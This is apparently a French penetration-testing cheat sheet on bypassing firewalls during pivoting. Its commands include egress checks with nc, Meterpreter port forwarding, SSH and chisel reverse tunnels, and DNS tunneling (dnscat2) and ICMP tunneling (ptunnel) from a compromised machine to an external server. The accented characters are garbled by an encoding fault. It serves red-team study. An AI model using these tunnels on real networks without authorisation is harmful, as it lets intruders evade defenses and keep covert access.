# üõ°Ô∏è Contournement de Firewall

[‚Üê Retour au pivoting](README.md) | [‚Üê Table des mati√®res](../README.md)

## üìã Table des Mati√®res
- [Techniques de Base](#techniques-de-base)
- [Port Forwarding](#port-forwarding)
- [Tunneling DNS](#tunneling-dns)
- [Tunneling ICMP](#tunneling-icmp)
- [Protocoles Autoris√©s](#protocoles-autoris√©s)

## Techniques de Base

### Identification des restrictions
```bash
# Test de connectivit√© sortante
curl http://google.com
wget http://example.com

# Test de ports sortants
nc -v external_ip 80
nc -v external_ip 443
nc -v external_ip 53
```

### Ports couramment autoris√©s
- **80/HTTP** : Trafic web standard
- **443/HTTPS** : Trafic web chiffr√©
- **53/DNS** : R√©solution de noms
- **25/SMTP** : Email sortant
- **21/FTP** : Transfert de fichiers

## Port Forwarding

### Via Meterpreter
```bash
# Redirection de port local
portfwd add -l 8080 -p 80 -r target_interne

# Redirection de port distant
portfwd add -L 0.0.0.0 -l 8080 -p 80 -r target_interne

# Liste des redirections actives
portfwd list

# Suppression d'une redirection
portfwd delete -l 8080
```

### Via SSH (si disponible)
```bash
# Tunnel local (port local vers port distant)
ssh -L 8080:target_interne:80 user@pivot_machine

# Tunnel distant (port distant vers port local)
ssh -R 8080:localhost:80 user@external_server

# Tunnel dynamique (proxy SOCKS)
ssh -D 9050 user@pivot_machine
```

## Tunneling DNS

### Outils recommand√©s
- **dnscat2** : Tunnel bidirectionnel via DNS
- **iodine** : Tunnel IP via DNS
- **dns2tcp** : Tunnel TCP via DNS

### Exemple avec dnscat2
```bash
# Serveur (machine externe)
dnscat2-server example.com

# Client (machine compromise)
dnscat2-client example.com
```

## Tunneling ICMP

### Avec ptunnel
```bash
# Serveur (machine externe)
ptunnel -x password

# Client (machine compromise)
ptunnel -p proxy_ip -lp 8080 -da target_ip -dp 80 -x password
```

## Protocoles Autoris√©s

### HTTP/HTTPS Tunneling
```bash
# Tunnel via HTTP avec chisel
# Serveur
chisel server --port 8080 --reverse

# Client
chisel client server_ip:8080 R:9050:socks
```

### SMTP Tunneling
```bash
# Si SMTP sortant est autoris√©
# Utiliser des outils comme smtp-tunnel
```

### R√©f√©rences
- [Chisel](chisel.md)
- [Ligolo-ng](ligolo-ng.md)
- [SSH Tunneling](ssh-tunneling.md)